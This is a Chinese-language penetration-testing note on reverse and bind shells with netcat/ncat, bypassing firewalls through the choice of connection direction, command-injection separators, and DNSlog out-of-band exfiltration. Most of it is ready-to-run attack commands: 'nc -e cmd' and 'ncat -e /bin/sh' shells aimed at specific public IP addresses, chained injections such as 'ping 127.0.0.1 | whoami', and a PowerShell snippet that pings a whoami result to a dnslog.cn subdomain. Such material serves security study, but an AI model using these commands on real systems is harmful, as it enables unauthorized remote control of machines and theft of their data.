反弹 Shell 命令-解决数据回显&解决数据通讯

  • 命令生成： https://forum.ywhack.com/shell.php

  • 1、正向连接：本地监听等待对方连接

    • Linux 控制 Windows
      • 绑定 CMD 到本地 5566 端口 
        1

        nc -e cmd -lvp 5566
      • 主动连接目标 5566 
        1

        ncat 47.122.23.131 5566
    • Windows 控制 Linux
      • 绑定 SH 到本地 5566 端口 
        1

        ncat -e /bin/sh -lvp 5566
      • 主动连接目标 5566 
        1

        nc 47.94.236.117 5566

  • 2、反向连接：主动给出去，对方监听

    • 绑定 CMD 到目标 5566 端口 
      1

      ncat -e /bin/sh 47.122.23.131 5566
    • 等待 5566 连接 
      1

      nc -lvvp 5566
    • 绑定 CMD 到目标 5566 端口 
      1

      nc -e cmd 47.94.236.117 5566
    • 等待 5566 连接 
      1

      ncat -lvvp 5566

  • 实际演示：

    • 4.反弹

防火墙绕过-正向连接&反向连接&内网服务器

  • 管道符：|（管道符号）||（逻辑或）＆&（逻辑与）＆（后台任务符号）

    • Windows-> | 、&、 ||、 &&
    • Linux-> ;、 |、 ||、 & 、&& 、‘ ’、（特有‘ ’和 ;）

  • 例子：

    1
2
3
4
5
6

    ping 127.0.0.1 ; whoami //前后命令都执行 
ping 127.0.0.1 | whoami  //执行whoami命令
ping  127.0.0.1 || whoami  //前后命令都执行 
ping  127.0.0.1 & whoami //前后命令都执行 ，但ping  127.0.0.1在后台执行
ping  127.0.0.1 && whoami //前后命令都执行
ping  'whoami'. f4an93.dnslog.cn //执行‘ ’中的whoami,并在其结果后加上. f4an93.dnslog.cn

  • 开启入站策略即入站限制了5566，采用反向连接给出去

    1
2

    Linux: ncat -lvvp 5566
Windows: nc -e cmd 47.94.236.117 5566

  • 开启出站策略即出站限制了5566，采用正向连接

    1
2

    Linux: ncat 47.122.23.131 5566
Windows: nc.exe -e cmd -lvvp 5566

  • ” 但进来难，出去宽松“若做了出站策略很有可能正向连接会被防火墙墙了

  • 正反向反弹案例-内网服务器

    • 只能内网主动交出数据，反向连接

防火墙组合数据不回显-ICMP带外查询Dnslog

  • 出站入站都开启策略（漏洞有，但是数据不回显）：OSI网络七层

  • 两种方案：

    1.反弹shell

    2.带外直询(Windows服务器情况下)

    1
2
3
4
5

    127.0.0.1 | powershell  // 用powershell变量赋值，并将执行结果带出来 
$x=whoami;  //将x赋值为whoami
$x=$x.Replace (' \ ','xxx'); //因为结果带有“\〞导致ping无法执行，所以Replace('\','xxx')，用xxx代替\
$y='.f4an93.dnslog.cn'; //将y赋值为.f4an93.dnslog.cn
$z=$x+$y; //将x、y和赋值给z
ping $z //ping  z
